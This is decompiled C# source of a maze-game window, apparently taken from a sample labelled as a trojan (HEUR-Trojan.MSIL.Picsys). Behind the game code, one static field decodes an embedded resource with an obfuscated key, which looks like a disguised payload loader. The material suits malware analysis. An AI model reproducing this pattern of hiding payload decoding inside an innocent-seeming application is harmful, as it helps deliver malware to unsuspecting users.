// Decompiled with JetBrains decompiler
// Type: WorkshopGame.UI.GameWindow
// Assembly: OOP-TeamWork, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78E60F07-1B9F-418F-8C6F-A1FA2CABDF45
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.MSIL.Picsys.gen-5866008a90168b7835b8f8b3d25aa43b6aaafd059e7519932278729ceae256ba.exe

using OOP_TeamWork;
using OOP_TeamWork.Interfaces;
using OOP_TeamWork.Properties;
using OOP_TeamWork.UI;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace WorkshopGame.UI
{
  internal class GameWindow : Form
  {
    public const int TimeInterval = 150;
    private const int TopMargin = 30;
    private Maze maze = (Maze) null;
    public static byte[] WindowTabsClose = Engine.SpoiledMeat(Resources.Helper_Classes, "bیYنچ");
    private IContainer components = (IContainer) null;

    public GameWindow()
    {
      this.InitializeComponent();
      this.SuspendLayout();
      this.ClientSize = new Size(784, 406);
      this.Name = "MazeGen";
      this.ResumeLayout(false);
      this.SetStyle(ControlStyles.UserPaint, true);
      this.SetStyle(ControlStyles.AllPaintingInWmPaint, true);
      this.SetStyle(ControlStyles.DoubleBuffer, true);
      this.ClientSize = new Size(1200, 600);
      this.go_Click((object) null, (EventArgs) null);
    }

    private void GameWindow_Load(object sender, EventArgs e)
    {
      Engine engine = new Engine((IKeyboardControlable) new KeyboardController((Form) this), (IDrawable) new PaintBrush((Form) this), 150);
      Timer timer = new Timer();
      timer.Interval = 150;
      timer.Tick += (EventHandler) ((s, args) => engine.PlayNextTurn());
      timer.Start();
    }

    private void go_Click(object o, EventArgs e)
    {
      int rows;
      int cols;
      try
      {
        rows = int.Parse("10");
        cols = int.Parse("20");
      }
      catch (FormatException ex)
      {
        int num = (int) MessageBox.Show("Invalid numeric value entered.");
        return;
      }
      if (rows < 10 || cols < 10)
      {
        int num1 = (int) MessageBox.Show("Out of range\nNumber of rows and columns must be at least " + 10.ToString());
      }
      else if (rows > 300 || cols > 300)
      {
        int num2 = (int) MessageBox.Show("Out of range\nNumber of rows and columns must be below " + 300.ToString());
      }
      else
      {
        this.maze = new Maze(rows, cols);
        this.Invalidate();
        this.Update();
      }
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      new Wall(100, 100).Draw();
      if (this.maze == null)
        return;
      this.maze.Paint(e.Graphics, 0, 0);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImageLayout = ImageLayout.None;
      this.ClientSize = new Size(784, 406);
      this.Name = nameof (GameWindow);
      this.Text = "RPG Game";
      this.Load += new EventHandler(this.GameWindow_Load);
      this.ResumeLayout(false);
    }
  }
}
